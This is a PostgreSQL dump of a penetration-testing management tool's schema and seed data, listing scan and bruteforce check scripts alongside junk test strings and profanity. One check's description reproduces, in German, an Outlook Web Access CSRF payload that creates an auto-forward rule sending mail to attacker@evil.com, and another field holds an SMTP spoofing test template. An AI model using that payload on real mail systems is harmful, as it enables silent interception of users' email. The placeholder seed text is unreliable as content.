CREATE TABLE target_check_inputs (
    target_id bigint NOT NULL,
    check_input_id bigint NOT NULL,
    value character varying,
    file character varying(1000),
    check_id bigint NOT NULL
);


ALTER TABLE public.target_check_inputs OWNER TO gtta;

--
-- TOC entry 175 (class 1259 OID 21770)
-- Dependencies: 6
-- Name: target_check_solutions; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE target_check_solutions (
    target_id bigint NOT NULL,
    check_solution_id bigint NOT NULL,
    check_id bigint NOT NULL
);


ALTER TABLE public.target_check_solutions OWNER TO gtta;

--
-- TOC entry 191 (class 1259 OID 26906)
-- Dependencies: 2054 6 658
-- Name: target_check_vulns; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE target_check_vulns (
    target_id bigint NOT NULL,
    check_id bigint NOT NULL,
    user_id bigint,
    deadline date,
    status vuln_status DEFAULT 'open'::vuln_status NOT NULL
);


ALTER TABLE public.target_check_vulns OWNER TO gtta;

--
-- TOC entry 176 (class 1259 OID 21773)
-- Dependencies: 2045 496 6 499
-- Name: target_checks; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE target_checks (
    target_id bigint NOT NULL,
    check_id bigint NOT NULL,
    result character varying,
    target_file character varying(1000),
    rating check_rating,
    started timestamp without time zone,
    pid bigint,
    status check_status DEFAULT 'open'::check_status NOT NULL,
    result_file character varying(1000),
    language_id bigint NOT NULL,
    protocol character varying(1000),
    port integer,
    override_target character varying(1000),
    user_id bigint NOT NULL
);


ALTER TABLE public.target_checks OWNER TO gtta;

--
-- TOC entry 177 (class 1259 OID 21780)
-- Dependencies: 6
-- Name: target_references; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE target_references (
    target_id bigint NOT NULL,
    reference_id bigint NOT NULL
);


ALTER TABLE public.target_references OWNER TO gtta;

--
-- TOC entry 178 (class 1259 OID 21783)
-- Dependencies: 6
-- Name: targets; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE targets (
    id bigint NOT NULL,
    project_id bigint NOT NULL,
    host character varying(1000) NOT NULL,
    description character varying(1000)
);


ALTER TABLE public.targets OWNER TO gtta;

--
-- TOC entry 179 (class 1259 OID 21789)
-- Dependencies: 6 178
-- Name: targets_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE targets_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.targets_id_seq OWNER TO gtta;

--
-- TOC entry 2297 (class 0 OID 0)
-- Dependencies: 179
-- Name: targets_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE targets_id_seq OWNED BY targets.id;


--
-- TOC entry 2298 (class 0 OID 0)
-- Dependencies: 179
-- Name: targets_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('targets_id_seq', 6, true);


--
-- TOC entry 180 (class 1259 OID 21791)
-- Dependencies: 2047 505 6
-- Name: users; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
--

CREATE TABLE users (
    id bigint NOT NULL,
    email character varying(1000) NOT NULL,
    password character varying(1000) NOT NULL,
    name character varying(1000),
    client_id bigint,
    role user_role DEFAULT 'admin'::user_role NOT NULL
);


ALTER TABLE public.users OWNER TO gtta;

--
-- TOC entry 181 (class 1259 OID 21798)
-- Dependencies: 6 180
-- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
--

CREATE SEQUENCE users_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.users_id_seq OWNER TO gtta;

--
-- TOC entry 2299 (class 0 OID 0)
-- Dependencies: 181
-- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gtta
--

ALTER SEQUENCE users_id_seq OWNED BY users.id;


--
-- TOC entry 2300 (class 0 OID 0)
-- Dependencies: 181
-- Name: users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
--

SELECT pg_catalog.setval('users_id_seq', 3, true);


--
-- TOC entry 2018 (class 2604 OID 21800)
-- Dependencies: 141 140
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_categories ALTER COLUMN id SET DEFAULT nextval('check_categories_id_seq'::regclass);


--
-- TOC entry 2019 (class 2604 OID 21801)
-- Dependencies: 144 143
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_controls ALTER COLUMN id SET DEFAULT nextval('check_controls_id_seq'::regclass);


--
-- TOC entry 2021 (class 2604 OID 21802)
-- Dependencies: 147 146
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_inputs ALTER COLUMN id SET DEFAULT nextval('check_inputs_id_seq'::regclass);


--
-- TOC entry 2023 (class 2604 OID 21803)
-- Dependencies: 150 149
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_results ALTER COLUMN id SET DEFAULT nextval('check_results_id_seq'::regclass);


--
-- TOC entry 2025 (class 2604 OID 21804)
-- Dependencies: 153 152
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY check_solutions ALTER COLUMN id SET DEFAULT nextval('check_solutions_id_seq'::regclass);


--
-- TOC entry 2027 (class 2604 OID 21805)
-- Dependencies: 156 155
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY checks ALTER COLUMN id SET DEFAULT nextval('checks_id_seq'::regclass);


--
-- TOC entry 2028 (class 2604 OID 21806)
-- Dependencies: 159 158
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY clients ALTER COLUMN id SET DEFAULT nextval('clients_id_seq'::regclass);


--
-- TOC entry 2031 (class 2604 OID 21807)
-- Dependencies: 161 160
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY emails ALTER COLUMN id SET DEFAULT nextval('emails_id_seq'::regclass);


--
-- TOC entry 2032 (class 2604 OID 21808)
-- Dependencies: 163 162
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY languages ALTER COLUMN id SET DEFAULT nextval('languages_id_seq'::regclass);


--
-- TOC entry 2033 (class 2604 OID 21809)
-- Dependencies: 165 164
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY project_details ALTER COLUMN id SET DEFAULT nextval('project_details_id_seq'::regclass);


--
-- TOC entry 2035 (class 2604 OID 21810)
-- Dependencies: 167 166
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY projects ALTER COLUMN id SET DEFAULT nextval('projects_id_seq'::regclass);


--
-- TOC entry 2036 (class 2604 OID 21811)
-- Dependencies: 169 168
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY "references" ALTER COLUMN id SET DEFAULT nextval('references_id_seq'::regclass);


--
-- TOC entry 2059 (class 2604 OID 28058)
-- Dependencies: 199 198 199
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_sections ALTER COLUMN id SET DEFAULT nextval('report_template_sections_id_seq'::regclass);


--
-- TOC entry 2056 (class 2604 OID 27339)
-- Dependencies: 195 196 196
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_template_summary ALTER COLUMN id SET DEFAULT nextval('report_template_summary_id_seq'::regclass);


--
-- TOC entry 2055 (class 2604 OID 27309)
-- Dependencies: 192 193 193
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY report_templates ALTER COLUMN id SET DEFAULT nextval('report_templates_id_seq'::regclass);


--
-- TOC entry 2049 (class 2604 OID 22076)
-- Dependencies: 183 182 183
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_categories ALTER COLUMN id SET DEFAULT nextval('risk_categories_id_seq'::regclass);


--
-- TOC entry 2053 (class 2604 OID 26364)
-- Dependencies: 188 189 189
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY risk_templates ALTER COLUMN id SET DEFAULT nextval('risk_templates_id_seq'::regclass);


--
-- TOC entry 2037 (class 2604 OID 21812)
-- Dependencies: 171 170
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY system ALTER COLUMN id SET DEFAULT nextval('system_id_seq'::regclass);


--
-- TOC entry 2046 (class 2604 OID 21813)
-- Dependencies: 179 178
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY targets ALTER COLUMN id SET DEFAULT nextval('targets_id_seq'::regclass);


--
-- TOC entry 2048 (class 2604 OID 21814)
-- Dependencies: 181 180
-- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
--

ALTER TABLE ONLY users ALTER COLUMN id SET DEFAULT nextval('users_id_seq'::regclass);


--
-- TOC entry 2215 (class 0 OID 21605)
-- Dependencies: 140
-- Data for Name: check_categories; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_categories (id, name) FROM stdin;
2	FTP
3	SMTP
4	SSH
5	TCP
6	Web Anonymous
1	DNS
8	Eine Kleine
10	zed
9	AUTHENTICATED WEB CHECKS
11	New & Modified Checks
\.


--
-- TOC entry 2216 (class 0 OID 21613)
-- Dependencies: 142
-- Data for Name: check_categories_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_categories_l10n (check_category_id, language_id, name) FROM stdin;
2	1	FTP
2	2	\N
3	1	SMTP
3	2	\N
4	1	SSH
4	2	\N
5	1	TCP
5	2	\N
6	1	Web Anonymous
6	2	\N
1	1	DNS
1	2	\N
8	1	\N
8	2	Eine Kleine
10	1	zed
10	2	\N
9	1	AUTHENTICATED WEB CHECKS
9	2	Piuyyy
11	1	New & Modified Checks
11	2	\N
\.


--
-- TOC entry 2217 (class 0 OID 21619)
-- Dependencies: 143
-- Data for Name: check_controls; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_controls (id, check_category_id, name) FROM stdin;
2	2	Default
3	3	Default
4	4	Default
5	5	Default
6	6	Default
7	1	This is a long name of the control
9	1	Some other important stuff
11	1	Empty Control
8	1	Session Handling
10	9	SESSION HANDLING & COOKIES
1	1	Default
12	11	New checks
\.


--
-- TOC entry 2218 (class 0 OID 21627)
-- Dependencies: 145
-- Data for Name: check_controls_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_controls_l10n (check_control_id, language_id, name) FROM stdin;
2	1	Default
2	2	\N
3	1	Default
3	2	\N
4	1	Default
4	2	\N
5	1	Default
5	2	\N
6	1	Default
6	2	\N
7	1	This is a long name of the control
7	2	\N
9	1	Some other important stuff
9	2	\N
11	1	Empty Control
11	2	\N
8	1	Session Handling
8	2	\N
10	1	SESSION HANDLING & COOKIES
10	2	\N
1	1	Default
1	2	zzz
12	1	New checks
12	2	\N
\.


--
-- TOC entry 2219 (class 0 OID 21633)
-- Dependencies: 146
-- Data for Name: check_inputs; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_inputs (id, check_id, name, description, sort_order, value) FROM stdin;
1	1	Hostname		0	
5	5	Timeout		0	120
6	5	Debug		1	1
7	6	Show All		0	0
8	8	Timeout		0	10
9	8	Max Results		1	100
10	8	Mode	Operation mode: 0 - output generated list only, 1 - resolve IP check	2	1
11	12	Hostname		0	
12	13	Hostname		0	
13	15	Long List		0	0
14	16	Long List		0	0
15	17	Users		0	
16	17	Passwords		1	
17	20	Recipient		0	
18	20	Server		1	
19	20	Login		2	
20	20	Password		3	
21	20	Sender		4	
22	20	Folder		5	
23	21	Timeout		0	10
24	21	Source E-mail		1	source@gmail.com
25	21	Destination E-mail		2	destination@gmail.com
26	22	Users		0	
27	22	Passwords		1	
28	23	Port Range	Port range that will be passed to nmap. Please use nmap syntax for -p command line argument (for example, 22; 1-65535; U:53,111,137,T:21-25,80,139,8080)	0	
29	23	Timeout	Timeout in milliseconds.	1	1000
30	24	Port Range	2 lines: start and end of the range.	0	1\r\n80
31	26	Range Count		0	10
32	32	Code	Possible values: php, cfm, asp.	0	php
34	35	Paths		0	
33	34	URLs		0	
35	36	Paths		0	
36	37	Paths		0	
37	42	Timeout		0	10
38	43	Page Type	Possible values: php, asp.	0	php
39	43	Cookies		1	
40	43	URL Limit		2	100
42	45	Hostname		0	
\.


--
-- TOC entry 2220 (class 0 OID 21642)
-- Dependencies: 148
-- Data for Name: check_inputs_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_inputs_l10n (check_input_id, language_id, name, description, value) FROM stdin;
1	1	Hostname	\N	\N
1	2	\N	\N	\N
5	1	Timeout	\N	120
5	2	\N	\N	\N
6	1	Debug	\N	1
6	2	\N	\N	\N
7	1	Show All	\N	0
7	2	\N	\N	\N
8	1	Timeout	\N	10
8	2	\N	\N	\N
9	1	Max Results	\N	100
9	2	\N	\N	\N
10	1	Mode	Operation mode: 0 - output generated list only, 1 - resolve IP check	1
10	2	\N	\N	\N
11	1	Hostname	\N	\N
11	2	\N	\N	\N
12	1	Hostname	\N	\N
12	2	\N	\N	\N
13	1	Long List	\N	0
13	2	\N	\N	\N
14	1	Long List	\N	0
14	2	\N	\N	\N
15	1	Users	\N	\N
15	2	\N	\N	\N
16	1	Passwords	\N	\N
16	2	\N	\N	\N
17	1	Recipient	\N	\N
17	2	\N	\N	\N
18	1	Server	\N	\N
18	2	\N	\N	\N
19	1	Login	\N	\N
19	2	\N	\N	\N
20	1	Password	\N	\N
20	2	\N	\N	\N
21	1	Sender	\N	\N
21	2	\N	\N	\N
22	1	Folder	\N	\N
22	2	\N	\N	\N
23	1	Timeout	\N	10
23	2	\N	\N	\N
24	1	Source E-mail	\N	source@gmail.com
24	2	\N	\N	\N
25	1	Destination E-mail	\N	destination@gmail.com
25	2	\N	\N	\N
26	1	Users	\N	\N
26	2	\N	\N	\N
27	1	Passwords	\N	\N
27	2	\N	\N	\N
28	1	Port Range	Port range that will be passed to nmap. Please use nmap syntax for -p command line argument (for example, 22; 1-65535; U:53,111,137,T:21-25,80,139,8080)	\N
28	2	\N	\N	\N
29	1	Timeout	Timeout in milliseconds.	1000
29	2	\N	\N	\N
30	1	Port Range	2 lines: start and end of the range.	1\r\n80
30	2	\N	\N	\N
31	1	Range Count	\N	10
31	2	\N	\N	\N
32	1	Code	Possible values: php, cfm, asp.	php
32	2	\N	\N	\N
34	1	Paths	\N	\N
34	2	\N	\N	\N
33	1	URLs	\N	\N
33	2	\N	\N	\N
35	1	Paths	\N	\N
35	2	\N	\N	\N
36	1	Paths	\N	\N
36	2	\N	\N	\N
37	1	Timeout	\N	10
37	2	\N	\N	\N
38	1	Page Type	Possible values: php, asp.	php
38	2	\N	\N	\N
39	1	Cookie	\N	\N
39	2	\N	\N	\N
40	1	URL Limit	\N	100
40	2	\N	\N	\N
42	1	Hostname	\N	\N
42	2	\N	\N	\N
\.


--
-- TOC entry 2221 (class 0 OID 21648)
-- Dependencies: 149
-- Data for Name: check_results; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_results (id, check_id, result, sort_order, title) FROM stdin;
3	3	Resulten	1	Test Deutsche
2	3	Here is no formatting at all - because this field is plain text. Please humble with that.\r\n\r\nLine span.	0	Test English
5	46	zzz & xxx <a> lolo	0	xxx
\.


--
-- TOC entry 2222 (class 0 OID 21657)
-- Dependencies: 151
-- Data for Name: check_results_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_results_l10n (check_result_id, language_id, result, title) FROM stdin;
3	1	\N	\N
3	2	Resulten	Test Deutsche
2	1	Here is no formatting at all - because this field is plain text. Please humble with that.\r\n\r\nLine span.	Test English
2	2	Result ' Pizda Dzhigurda (de)	Zuzuz
5	1	zzz & xxx <a> lolo	xxx
5	2	\N	\N
\.


--
-- TOC entry 2223 (class 0 OID 21663)
-- Dependencies: 152
-- Data for Name: check_solutions; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_solutions (id, check_id, solution, sort_order, title) FROM stdin;
5	3	i love you too	1	tears of prophecy
4	3	<i>zoo</i><br><i>gooooo<br><br></i>pom pom<br><i><br></i><b>black</b>	0	aduljadei
7	46	zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	0	Fuck something
\.


--
-- TOC entry 2224 (class 0 OID 21672)
-- Dependencies: 154
-- Data for Name: check_solutions_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY check_solutions_l10n (check_solution_id, language_id, solution, title) FROM stdin;
5	1	i love you too	tears of prophecy
5	2	ich liebe dir	\N
4	1	<i>zoo</i><br><i>gooooo<br><br></i>pom pom<br><i><br></i><b>black</b>	aduljadei
4	2	\N	\N
7	1	zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	Fuck something
7	2	\N	\N
\.


--
-- TOC entry 2225 (class 0 OID 21678)
-- Dependencies: 155
-- Data for Name: checks; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY checks (id, check_control_id, name, background_info, hints, advanced, automated, script, multiple_solutions, protocol, port, question, reference_id, reference_code, reference_url, effort) FROM stdin;
7	1	DNS IP Range			f	t	dns_ip_range.pl	f		\N		1			2
9	1	DNS NIC Whois			f	t	nic_whois.pl	f		\N		1			2
10	1	DNS NS Version			f	t	ns_version.pl	f		\N		1			2
12	1	DNS SOA			f	t	dns_soa.py	f		\N		1			2
13	1	DNS SPF			f	t	dns_spf.py	f		\N		1			2
15	1	DNS Subdomain Bruteforce			f	t	subdomain_bruteforce.pl	f		\N		1			2
16	1	DNS Top TLDs			f	t	dns_top_tlds.pl	f		\N		1			2
17	2	FTP Bruteforce			f	t	ftp_bruteforce.pl	f		\N		1			2
18	3	SMTP Banner			f	t	smtp_banner.py	f		\N		1			2
19	3	SMTP DNSBL			f	t	smtp_dnsbl.py	f		\N		1			2
20	3	SMTP Filter			f	t	smtp_filter.py	f		\N		1			2
21	3	SMTP Relay			f	t	smtp_relay.pl	f		\N		1			2
22	4	SSH Bruteforce			f	t	ssh_bruteforce.pl	f		\N		1			2
23	5	Nmap Port Scan			f	t	pscan.pl	f		\N		1			2
24	5	TCP Port Scan			f	t	portscan.pl	f		\N		1			2
25	5	TCP Traceroute			f	t	tcp_traceroute.py	f		80		1			2
26	6	Apache DoS			f	t	apache_dos.pl	f		\N		1			2
27	6	Fuzz Check			f	t	fuzz_check.pl	f		\N		1			2
28	6	Google URL			f	t	google_url.pl	f		\N		1			2
29	6	Grep URL			f	t	grep_url.pl	f	http	\N		1			2
30	6	HTTP Banner			f	t	http_banner.pl	f	http	\N		1			2
31	6	Joomla Scan			f	t	joomla_scan.pl	f	http	\N		1			2
32	6	Login Pages			f	t	login_pages.pl	f	http	\N		1			2
33	6	Nikto			f	t	nikto.pl	f	http	80		1			2
34	6	URL Scan			f	t	urlscan.pl	f	http	\N		1			2
35	6	Web Auth Scanner			f	t	www_auth_scanner.pl	f	http	80		1			2
36	6	Web Directory Scanner			f	t	www_dir_scanner.pl	f	http	80		1			2
37	6	Web File Scanner			f	t	www_file_scanner.pl	f	http	80		1			2
38	6	Web HTTP Methods			f	t	web_http_methods.py	f		\N		1			2
39	6	Web Server CMS			f	t	webserver_cms.pl	f		\N		1			2
40	6	Web Server Error Message			f	t	webserver_error_msg.pl	f		\N		1			2
41	6	Web Server Files			f	t	webserver_files.pl	f		\N		1			2
42	6	Web Server SSL			f	t	webserver_ssl.pl	f		\N		1			2
43	6	Web SQL XSS			f	t	web_sql_xss.py	f		\N		1			2
5	7	DNS Find NS			f	t	dns_find_ns.pl	f		\N		1			2
8	8	DNS NIC Typosquatting			f	t	nic_typosquatting.pl	f		\N		1			2
11	8	DNS Resolve IP			f	t	dns_resolve_ip.pl	f		\N		1			2
14	9	DNS SPF (Perl)			f	t	dns_spf.pl	f		\N		1			2
45	1	DNS A (Non-Recursive)			f	t	dns_a_nr.py	f		\N		1			2
6	1	DNS Hosting	hello		f	t	dns_hosting.py	f		\N		1			2
3	1	DNS AFXR	hey <b>fuck \\' sss</b><br><b>How are you?<br></b>sd<br><b></b>1. this is some kind of list<br>2. lololo upup up<br>sdfa<br>asdf<br>asdf<br>sdd<br>sdf<br>sdf	jjj<br>what the fuck did you do?	f	t	dns_afxr.pl	f		\N	No more no more	1			2
1	1	DNS A	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.		f	t	dns_a.py	f		\N		1			2
47	12	CMS check			f	t	cms_detection.py	f	http	80		1			2
48	10	yay			f	f		f		\N		1			2
46	10	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><ul><li>inherited</li><li>list</li></ul><li>tres</li></ul><br><ol><li>eins</li><li>zwei</li><li>drei</li><ol><li>vier</li></ol><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	f	t	w3af_form_autocomplete.py	f		\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	1			2
\.


--
-- TOC entry 2226 (class 0 OID 21687)
-- Dependencies: 157
-- Data for Name: checks_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
--

COPY checks_l10n (check_id, language_id, name, background_info, hints, reference, question) FROM stdin;
7	1	DNS IP Range	\N	\N	\N	\N
7	2	\N	\N	\N	\N	\N
9	1	DNS NIC Whois	\N	\N	\N	\N
9	2	\N	\N	\N	\N	\N
10	1	DNS NS Version	\N	\N	\N	\N
10	2	\N	\N	\N	\N	\N
12	1	DNS SOA	\N	\N	\N	\N
12	2	\N	\N	\N	\N	\N
13	1	DNS SPF	\N	\N	\N	\N
13	2	\N	\N	\N	\N	\N
15	1	DNS Subdomain Bruteforce	\N	\N	\N	\N
15	2	\N	\N	\N	\N	\N
16	1	DNS Top TLDs	\N	\N	\N	\N
16	2	\N	\N	\N	\N	\N
17	1	FTP Bruteforce	\N	\N	\N	\N
17	2	\N	\N	\N	\N	\N
18	1	SMTP Banner	\N	\N	\N	\N
18	2	\N	\N	\N	\N	\N
19	1	SMTP DNSBL	\N	\N	\N	\N
19	2	\N	\N	\N	\N	\N
20	1	SMTP Filter	\N	\N	\N	\N
20	2	\N	\N	\N	\N	\N
21	1	SMTP Relay	\N	\N	\N	\N
21	2	\N	\N	\N	\N	\N
22	1	SSH Bruteforce	\N	\N	\N	\N
22	2	\N	\N	\N	\N	\N
23	1	Nmap Port Scan	\N	\N	\N	\N
23	2	\N	\N	\N	\N	\N
24	1	TCP Port Scan	\N	\N	\N	\N
24	2	\N	\N	\N	\N	\N
25	1	TCP Traceroute	\N	\N	\N	\N
25	2	\N	\N	\N	\N	\N
26	1	Apache DoS	\N	\N	\N	\N
26	2	\N	\N	\N	\N	\N
27	1	Fuzz Check	\N	\N	\N	\N
27	2	\N	\N	\N	\N	\N
28	1	Google URL	\N	\N	\N	\N
28	2	\N	\N	\N	\N	\N
29	1	Grep URL	\N	\N	\N	\N
29	2	\N	\N	\N	\N	\N
30	1	HTTP Banner	\N	\N	\N	\N
30	2	\N	\N	\N	\N	\N
31	1	Joomla Scan	\N	\N	\N	\N
31	2	\N	\N	\N	\N	\N
32	1	Login Pages	\N	\N	\N	\N
32	2	\N	\N	\N	\N	\N
33	1	Nikto	\N	\N	\N	\N
33	2	\N	\N	\N	\N	\N
34	1	URL Scan	\N	\N	\N	\N
34	2	\N	\N	\N	\N	\N
35	1	Web Auth Scanner	\N	\N	\N	\N
35	2	\N	\N	\N	\N	\N
36	1	Web Directory Scanner	\N	\N	\N	\N
36	2	\N	\N	\N	\N	\N
37	1	Web File Scanner	\N	\N	\N	\N
37	2	\N	\N	\N	\N	\N
38	1	Web HTTP Methods	\N	\N	\N	\N
38	2	\N	\N	\N	\N	\N
39	1	Web Server CMS	\N	\N	\N	\N
39	2	\N	\N	\N	\N	\N
40	1	Web Server Error Message	\N	\N	\N	\N
40	2	\N	\N	\N	\N	\N
41	1	Web Server Files	\N	\N	\N	\N
